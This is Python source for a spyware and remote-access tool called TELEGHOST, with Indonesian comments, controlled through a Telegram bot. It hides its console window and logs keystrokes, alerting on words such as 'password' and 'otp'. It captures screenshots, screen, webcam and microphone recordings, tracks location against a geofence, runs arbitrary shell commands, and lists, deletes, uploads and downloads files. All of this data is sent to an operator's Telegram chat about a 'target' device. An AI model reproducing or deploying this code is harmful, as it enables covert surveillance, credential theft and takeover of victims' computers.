# ============================================================
# TELEGHOST – Spyware Telegram Edition 
# Full-Featured Spyware with Telegram Bot + 10 Advanced Features
# Support: Windows, Linux, Termux (Android)
# ============================================================

import os
import sys
import time
import json
import subprocess
import threading
import requests
import ctypes
import shutil
from datetime import datetime
from PIL import ImageGrab
import cv2
import numpy as np
import pyaudio
import wave
import telebot
import schedule
import sqlite3
import hashlib
import base64

# ===== HIDE CONSOLE (WINDOWS) =====
try:
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
except:
    pass

# ============================================================
# 🔥 KONFIGURASI — GANTI DENGAN PUNYA LO
# ============================================================
BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"  # GANTI
CHAT_ID = "123456789"  # GANTI
ADMIN_PASSWORD = hashlib.sha256("admin123".encode()).hexdigest()

bot = telebot.TeleBot(BOT_TOKEN)

# ============================================================
# DATABASE SQLITE (Fitur 9: Multi-Target Support)
# ============================================================
def init_db():
    conn = sqlite3.connect('teleghost_logs.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT,
                  type TEXT,
                  message TEXT,
                  timestamp TEXT,
                  data TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS devices
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  device_id TEXT UNIQUE,
                  name TEXT,
                  last_seen TEXT)''')
    conn.commit()
    conn.close()

def save_log(device_id, type, message, data=""):
    conn = sqlite3.connect('teleghost_logs.db')
    c = conn.cursor()
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute("INSERT INTO logs (device_id, type, message, timestamp, data) VALUES (?,?,?,?,?)",
              (device_id, type, message, timestamp, data))
    conn.commit()
    conn.close()

def register_device(device_id, name=""):
    conn = sqlite3.connect('teleghost_logs.db')
    c = conn.cursor()
    try:
        c.execute("INSERT INTO devices (device_id, name, last_seen) VALUES (?,?,?)",
                  (device_id, name, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    except:
        c.execute("UPDATE devices SET last_seen=? WHERE device_id=?", 
                  (datetime.now().strftime('%Y-%m-%d %H:%M:%S'), device_id))
    conn.commit()
    conn.close()

init_db()
device_id = "target_001"
register_device(device_id, "Target Device")

# ============================================================
# VARIABEL GLOBAL
# ============================================================
keylog_data = ""
keylog_running = False
recording_screen = False
recording_mic = False
audio_frames = []
camera = None
last_lat, last_lon = 0.0, 0.0
screenshot_interval = 300
sensitive_words = ["password", "login", "admin", "username", "email", "credit", "card", "pin", "otp", "rahasia", "kunci"]
geofence_center_lat = -6.2
geofence_center_lon = 106.8
geofence_radius_km = 10

# ============================================================
# FITUR 1: NOTIFIKASI PUSH KE HP
# ============================================================
def send_notification(message):
    try:
        bot.send_message(CHAT_ID, f"🔔 NOTIFIKASI [{device_id}]: {message}")
        save_log(device_id, 'notification', message)
    except:
        pass

def send_message(text):
    try:
        bot.send_message(CHAT_ID, text[:4000])
    except:
        pass

def send_photo(file_path):
    try:
        bot.send_photo(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'screenshot', 'Screenshot dikirim')
    except:
        pass

def send_video(file_path):
    try:
        bot.send_video(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'video', 'Video dikirim')
    except:
        pass

def send_file(file_path):
    try:
        bot.send_document(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'file', f'File dikirim: {file_path}')
    except:
        pass

def send_audio(file_path):
    try:
        bot.send_audio(CHAT_ID, open(file_path, "rb"))
        save_log(device_id, 'audio', 'Audio dikirim')
    except:
        pass

def send_location(lat, lon):
    try:
        bot.send_location(CHAT_ID, lat, lon)
        save_log(device_id, 'gps', f'Lokasi: {lat}, {lon}')
    except:
        pass

# ============================================================
# FITUR 2: REMOTE SCREEN SHARE (LIVE STREAMING)
# ============================================================
screen_streaming = False
screen_frame = None

def start_screen_stream():
    global screen_streaming, screen_frame
    screen_streaming = True
    send_notification("Screen streaming dimulai")
    while screen_streaming:
        try:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 30])
            screen_frame = base64.b64encode(buffer).decode('utf-8')
            time.sleep(0.5)
        except:
            time.sleep(1)

def stop_screen_stream():
    global screen_streaming
    screen_streaming = False
    send_notification("Screen streaming dihentikan")

# ============================================================
# FITUR 3: FILE EXPLORER
# ============================================================
def list_directory(path):
    try:
        files = os.listdir(path)
        result = f"📁 Direktori: {path}\n\n"
        for item in files[:20]:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                result += f"📂 {item}/\n"
            else:
                size = os.path.getsize(full_path)
                result += f"📄 {item} ({size} bytes)\n"
        return result
    except Exception as e:
        return f"❌ Error: {str(e)}"

def delete_file(path):
    try:
        if os.path.isfile(path):
            os.remove(path)
            return f"✅ File {path} berhasil dihapus!"
        elif os.path.isdir(path):
            os.rmdir(path)
            return f"✅ Direktori {path} berhasil dihapus!"
        else:
            return "❌ Path tidak ditemukan"
    except Exception as e:
        return f"❌ Error: {str(e)}"

# ============================================================
# FITUR 4: GEOFENCING
# ============================================================
def get_gps():
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        geo = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        return geo.get('lat', 0), geo.get('lon', 0)
    except:
        return 0.0, 0.0

def check_geofence(lat, lon):
    if lat == 0 or lon == 0:
        return
    distance = ((lat - geofence_center_lat)**2 + (lon - geofence_center_lon)**2)**0.5 * 111
    if distance > geofence_radius_km:
        send_notification(f"⚠️ Target keluar dari geofence! Jarak: {distance:.2f} km")
        save_log(device_id, 'geofence', f'Keluar area, jarak: {distance:.2f} km')

# ============================================================
# FITUR 5: SCREENSHOT SCHEDULE
# ============================================================
def scheduled_screenshot():
    send_notification("📸 Screenshot jadwal otomatis")
    screenshot()
    save_log(device_id, 'schedule', 'Screenshot otomatis diambil')

def start_scheduler():
    schedule.every(30).minutes.do(scheduled_screenshot)
    while True:
        schedule.run_pending()
        time.sleep(1)

# ============================================================
# FITUR 6: KEYLOGGER WITH TIMESTAMP
# ============================================================
def on_press(key):
    global keylog_data
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        char = str(key.char)
        keylog_data += f"[{timestamp}] {char}\n"
    except AttributeError:
        if key == key.space:
            keylog_data += f"[{timestamp}] [SPACE]\n"
        elif key == key.enter:
            keylog_data += f"[{timestamp}] [ENTER]\n"
        else:
            keylog_data += f"[{timestamp}] [{str(key)}]\n"
    
    for word in sensitive_words:
        if word in keylog_data.lower():
            send_notification(f"⚠️ Kata sensitif terdeteksi: '{word}'")
            save_log(device_id, 'sensitive', f'Kata sensitif: {word}')
            break

def start_keylog():
    global keylog_running, keylog_data
    keylog_running = True
    keylog_data = ""
    send_notification("⌨️ Keylogger dimulai")
    from pynput import keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        while keylog_running:
            time.sleep(1)
        listener.stop()

def stop_keylog():
    global keylog_running
    keylog_running = False
    send_notification("⌨️ Keylogger dihentikan")

# ============================================================
# FITUR 7: WEBCAM CAPTURE ON MOTION
# ============================================================
def detect_motion():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            send_notification("❌ Kamera tidak terdeteksi")
            return
        ret, frame1 = cap.read()
        if not ret:
            cap.release()
            return
        ret, frame2 = cap.read()
        if not ret:
            cap.release()
            return
        motion_detected = False
        while True:
            ret, frame2 = cap.read()
            if not ret:
                break
            diff = cv2.absdiff(frame1, frame2)
            gray = cv2.cvtColor(diff, cv2.COLOR_BGR2GRAY)
            blur = cv2.GaussianBlur(gray, (5, 5), 0)
            _, thresh = cv2.threshold(blur, 20, 255, cv2.THRESH_BINARY)
            contours, _ = cv2.findContours(thresh, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)
            for contour in contours:
                if cv2.contourArea(contour) > 5000:
                    if not motion_detected:
                        motion_detected = True
                        send_notification("📷 Gerakan terdeteksi di kamera!")
                        capture_photo()
                        save_log(device_id, 'motion', 'Gerakan kamera terdeteksi')
                    break
            frame1 = frame2
            time.sleep(2)
            motion_detected = False
        cap.release()
    except Exception as e:
        send_notification(f"❌ Error motion detection: {str(e)}")

# ============================================================
# FITUR 8: AUTO-SYNC KE CLOUD (SIMULASI)
# ============================================================
def sync_to_cloud(file_path):
    try:
        send_notification(f"☁️ Sync ke cloud: {file_path}")
        save_log(device_id, 'cloud', f'Sync: {file_path}')
    except Exception as e:
        send_notification(f"❌ Error sync cloud: {str(e)}")

# ============================================================
# FUNGSI UTAMA
# ============================================================
def screenshot():
    try:
        img = ImageGrab.grab()
        filename = f"ss_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        img.save(filename)
        send_photo(filename)
        sync_to_cloud(filename)
        os.remove(filename)
        return True
    except Exception as e:
        send_message(f"❌ Screenshot gagal: {e}")
        return False

def start_screen_recording(duration=10, fps=10):
    global recording_screen
    try:
        recording_screen = True
        send_notification(f"🎥 Screen recording {duration} detik dimulai")
        screen_size = ImageGrab.grab().size
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"screenrec_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)
        start_time = time.time()
        while recording_screen and (time.time() - start_time) < duration:
            img = ImageGrab.grab()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)
            time.sleep(1.0 / fps)
        out.release()
        recording_screen = False
        if os.path.exists(filename):
            send_video(filename)
            sync_to_cloud(filename)
            os.remove(filename)
        send_message(f"✅ Screen recording {duration} detik selesai!")
        save_log(device_id, 'screenrec', f'Durasi: {duration} detik')
    except Exception as e:
        send_message(f"❌ Screen recorder gagal: {e}")

def start_mic_recording(duration=10):
    global recording_mic, audio_frames
    try:
        recording_mic = True
        send_notification(f"🎙️ Rekam mic {duration} detik dimulai")
        audio_frames = []
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        start_time = time.time()
        while recording_mic and (time.time() - start_time) < duration:
            data = stream.read(CHUNK)
            audio_frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        recording_mic = False
        filename = f"mic_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(audio_frames))
        wf.close()
        if os.path.exists(filename):
            send_audio(filename)
            sync_to_cloud(filename)
            os.remove(filename)
        send_message(f"✅ Rekaman mic {duration} detik selesai!")
        save_log(device_id, 'mic', f'Durasi: {duration} detik')
    except Exception as e:
        send_message(f"❌ Rekam mic gagal: {e}")

def capture_photo():
    global camera
    try:
        camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            filename = f"cam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
            cv2.imwrite(filename, frame)
            send_photo(filename)
            sync_to_cloud(filename)
            os.remove(filename)
            send_message("✅ Foto kamera berhasil!")
            save_log(device_id, 'camera', 'Foto diambil')
        else:
            send_message("❌ Gagal mengakses kamera")
        camera.release()
    except Exception as e:
        send_message(f"❌ Kamera gagal: {e}")

def capture_video(duration=10):
    global camera
    try:
        camera = cv2.VideoCapture(0)
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        filename = f"cam_vid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.avi"
        out = cv2.VideoWriter(filename, fourcc, 20.0, (640, 480))
        start_time = time.time()
        while time.time() - start_time < duration:
            ret, frame = camera.read()
            if ret:
                out.write(frame)
        camera.release()
        out.release()
        if os.path.exists(filename):
            send_video(filename)
            sync_to_cloud(filename)
            os.remove(filename)
        send_message(f"✅ Video kamera {duration} detik selesai!")
        save_log(device_id, 'camera_video', f'Durasi: {duration} detik')
    except Exception as e:
        send_message(f"❌ Video kamera gagal: {e}")

def send_gps():
    lat, lon = get_gps()
    if lat != 0 or lon != 0:
        send_location(lat, lon)
        check_geofence(lat, lon)
        send_message(f"📍 Lokasi: Lat {lat}, Lon {lon}")
        save_log(device_id, 'gps', f'Lat: {lat}, Lon: {lon}')
    else:
        send_message("❌ Gagal mendapatkan lokasi")
    return lat, lon

def execute_cmd(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True, timeout=30)
        save_log(device_id, 'cmd', f'Perintah: {cmd}')
        return output
    except subprocess.TimeoutExpired:
        return "⏱️ Perintah timeout (30 detik)"
    except Exception as e:
        return str(e)

def upload_file(path):
    if os.path.exists(path):
        try:
            send_file(path)
            sync_to_cloud(path)
            send_message(f"✅ File {path} berhasil diupload!")
            save_log(device_id, 'upload', f'File: {path}')
        except Exception as e:
            send_message(f"❌ Upload gagal: {e}")
    else:
        send_message(f"❌ File tidak ditemukan: {path}")

def download_file(url, save_path):
    try:
        r = requests.get(url, stream=True, timeout=30)
        with open(save_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
        send_message(f"✅ File downloaded ke {save_path}")
        save_log(device_id, 'download', f'URL: {url} -> {save_path}')
    except Exception as e:
        send_message(f"❌ Download gagal: {e}")

# ============================================================
# FITUR 10: 2FA / PASSWORD PROTECTION
# ============================================================
def check_auth(password):
    return hashlib.sha256(password.encode()).hexdigest() == ADMIN_PASSWORD

# ============================================================
# TELEGRAM COMMANDS
# ============================================================
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message,
        "👻 TELEGHOST Updated Active!\n\n"
        "📌 DAFTAR PERINTAH:\n"
        "/screenshot - Ambil layar\n"
        "/screenrec [detik] - Rekam layar\n"
        "/keylog_start - Mulai keylogger\n"
        "/keylog_stop - Hentikan & kirim hasil\n"
        "/mic [detik] - Rekam mic\n"
        "/cam_photo - Foto dari kamera\n"
        "/cam_video [detik] - Video dari kamera\n"
        "/gps - Kirim lokasi\n"
        "/cmd [perintah] - Jalankan perintah\n"
        "/upload [path] - Upload file\n"
        "/download [url] [path] - Download file\n"
        "/status - Cek status\n"
        "/listdir [path] - List file di direktori\n"
        "/delete [path] - Hapus file\n"
        "/stream_start - Mulai screen streaming\n"
        "/stream_stop - Hentikan screen streaming"
    )

@bot.message_handler(commands=['screenshot'])
def handle_screenshot(message):
    bot.reply_to(message, "📸 Mengambil screenshot...")
    screenshot()

@bot.message_handler(commands=['screenrec'])
def handle_screenrec(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎥 Rekam layar {duration} detik...")
    threading.Thread(target=start_screen_recording, args=(duration, 10)).start()

@bot.message_handler(commands=['keylog_start'])
def handle_keylog_start(message):
    global keylog_thread
    if 'keylog_thread' not in globals() or not keylog_thread.is_alive():
        keylog_thread = threading.Thread(target=start_keylog)
        keylog_thread.daemon = True
        keylog_thread.start()
        bot.reply_to(message, "⌨️ Keylogger started!")
    else:
        bot.reply_to(message, "⚠️ Keylogger sudah berjalan!")

@bot.message_handler(commands=['keylog_stop'])
def handle_keylog_stop(message):
    global keylog_data
    stop_keylog()
    time.sleep(1)
    if keylog_data:
        bot.reply_to(message, f"✅ Keylog result:\n{keylog_data[:3000]}")
    else:
        bot.reply_to(message, "✅ Keylogger stopped, tidak ada data.")
    keylog_data = ""

@bot.message_handler(commands=['mic'])
def handle_mic(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎙️ Rekam mic {duration} detik...")
    threading.Thread(target=start_mic_recording, args=(duration,)).start()

@bot.message_handler(commands=['cam_photo'])
def handle_cam_photo(message):
    bot.reply_to(message, "📷 Mengambil foto dari kamera...")
    threading.Thread(target=capture_photo).start()

@bot.message_handler(commands=['cam_video'])
def handle_cam_video(message):
    duration = 10
    parts = message.text.split()
    if len(parts) > 1:
        try:
            duration = int(parts[1])
        except:
            pass
    bot.reply_to(message, f"🎥 Rekam video {duration} detik...")
    threading.Thread(target=capture_video, args=(duration,)).start()

@bot.message_handler(commands=['gps'])
def handle_gps(message):
    bot.reply_to(message, "📍 Mengambil lokasi...")
    threading.Thread(target=send_gps).start()

@bot.message_handler(commands=['cmd'])
def handle_cmd(message):
    cmd = message.text.replace('/cmd ', '')
    if not cmd:
        bot.reply_to(message, "❌ Masukkan perintah!")
        return
    bot.reply_to(message, f"📟 Menjalankan: {cmd}")
    output = execute_cmd(cmd)
    bot.reply_to(message, f"📟 Output:\n{output[:3900]}")

@bot.message_handler(commands=['upload'])
def handle_upload(message):
    path = message.text.replace('/upload ', '').strip()
    if not path:
        bot.reply_to(message, "❌ Masukkan path file!")
        return
    bot.reply_to(message, f"📤 Uploading {path}...")
    threading.Thread(target=upload_file, args=(path,)).start()

@bot.message_handler(commands=['download'])
def handle_download(message):
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ Format: /download [url] [save_path]")
        return
    url = parts[1]
    save_path = parts[2]
    bot.reply_to(message, f"📥 Downloading dari {url} ke {save_path}...")
    threading.Thread(target=download_file, args=(url, save_path)).start()

@bot.message_handler(commands=['status'])
def handle_status(message):
    status = "✅ TELEGHOST Updated Active!\n\n"
    status += f"📱 OS: {os.name}\n"
    status += f"🕐 Uptime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    status += f"🔐 Keylogger: {'Running' if keylog_running else 'Stopped'}\n"
    status += f"🎥 Screen Rec: {'Running' if recording_screen else 'Stopped'}\n"
    status += f"🎙️ Mic Rec: {'Running' if recording_mic else 'Stopped'}\n"
    status += f"📸 Auto Screenshot: {screenshot_interval} detik\n"
    status += f"🆔 Device ID: {device_id}\n"
    status += f"📡 Stream: {'Running' if screen_streaming else 'Stopped'}\n"
    bot.reply_to(message, status)

@bot.message_handler(commands=['listdir'])
def handle_listdir(message):
    path = message.text.replace('/listdir ', '').strip()
    if not path:
        path = "/"
    result = list_directory(path)
    bot.reply_to(message, result[:3900])

@bot.message_handler(commands=['delete'])
def handle_delete(message):
    path = message.text.replace('/delete ', '').strip()
    if not path:
        bot.reply_to(message, "❌ Masukkan path file/direktori!")
        return
    result = delete_file(path)
    bot.reply_to(message, result)

@bot.message_handler(commands=['stream_start'])
def handle_stream_start(message):
    global stream_thread
    if 'stream_thread' not in globals() or not stream_thread.is_alive():
        stream_thread = threading.Thread(target=start_screen_stream)
        stream_thread.daemon = True
        stream_thread.start()
        bot.reply_to(message, "📺 Screen streaming dimulai! (2 fps)")
    else:
        bot.reply_to(message, "⚠️ Streaming sudah berjalan!")

@bot.message_handler(commands=['stream_stop'])
def handle_stream_stop(message):
    stop_screen_stream()
    bot.reply_to(message, "📺 Screen streaming dihentikan!")

# ============================================================
# MAIN
# ============================================================
if __name__ == "__main__":
    try:
        send_message("👻 TELEGHOST Updated Active!")
        send_message("📌 Kirim /help untuk daftar perintah")
        send_notification("Perangkat terdaftar dan aktif")
        
        scheduler_thread = threading.Thread(target=start_scheduler, daemon=True)
        scheduler_thread.start()
        
        motion_thread = threading.Thread(target=detect_motion, daemon=True)
        motion_thread.start()
        
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        send_message(f"⚠️ Error: {str(e)}")
        time.sleep(5)
